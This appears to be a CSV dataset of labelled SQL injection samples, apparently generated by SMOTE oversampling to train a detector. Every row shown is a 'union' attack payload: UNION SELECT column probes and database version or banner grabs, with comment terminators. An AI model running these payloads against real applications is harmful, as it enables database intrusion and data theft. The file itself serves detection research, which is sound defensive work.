id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000150,attack,union,"-4280%""   )    )     )   union all select 7981,7981--",nearest_attack_euclidean,R000424,0.2756691306757778
SMOTE_000151,attack,union,"-2782"" union all select 2109,2109,2109#",nearest_attack_euclidean,R000748,0.028290257454376976
SMOTE_000152,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,0.3303075342234858
SMOTE_000153,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,0.3622313621157032
SMOTE_000154,attack,union,"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000663,0.256197107517842
SMOTE_000155,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,0.24523910558451262
SMOTE_000156,attack,union,"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",nearest_attack_euclidean,R000529,0.32274440451644676
SMOTE_000157,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,0.29684069531037915
SMOTE_000158,attack,union,"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",nearest_attack_euclidean,R000339,0.2962168591105936
SMOTE_000159,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000512,0.29217744730294304
SMOTE_000160,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,0.09447649498852824
SMOTE_000161,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000311,0.44415616385313983
SMOTE_000162,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000649,0.14080798459517913
SMOTE_000163,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000498,0.10814213616357136
SMOTE_000164,attack,union,"-9240' union all select 6538,6538,6538#",nearest_attack_euclidean,R000593,0.12417623545223959
SMOTE_000165,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,0.2435561008772308
SMOTE_000166,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000634,0.36484762603207055
SMOTE_000167,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000257,0.14388246980571245
SMOTE_000168,attack,union,"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",nearest_attack_euclidean,R000755,0.13618526526341498
SMOTE_000169,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000059,0.26977334603347075
SMOTE_000170,attack,union,"-2518' union all select 6818,6818,6818,6818,6818,6818#",nearest_attack_euclidean,R000769,0.3204670972050757
SMOTE_000171,attack,union,"1'+  (  select ocvc where 6981  =  6981 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000304,0.1629760698758786
SMOTE_000172,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000550,0.48169537538148727
SMOTE_000173,attack,union,"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",nearest_attack_euclidean,R000415,0.1764486559535742
SMOTE_000174,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.0033761717859824712
SMOTE_000175,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000431,0.481012799864878
SMOTE_000176,attack,union,"-8902 union all select 4339,4339,4339#",nearest_attack_euclidean,R000221,0.599486564817549
SMOTE_000177,attack,union,"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",nearest_attack_euclidean,R000401,0.13333929608497386
SMOTE_000178,attack,union," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.054608863917237
SMOTE_000179,attack,union,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",nearest_attack_euclidean,R000599,0.5106896030076823
SMOTE_000180,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000731,0.03845814431897428
SMOTE_000181,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000313,0.047087754174198374
SMOTE_000182,attack,union," select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000153,0.42934689025615236
SMOTE_000183,attack,union,"-9082 union all select 9858,9858,9858,9858,9858,9858--",nearest_attack_euclidean,R000722,0.041333485989543194
SMOTE_000184,attack,union,"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",nearest_attack_euclidean,R000296,0.3629940994077866
SMOTE_000185,attack,union,"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",nearest_attack_euclidean,R000339,0.6563638127551789
SMOTE_000186,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,0.3296738311193826
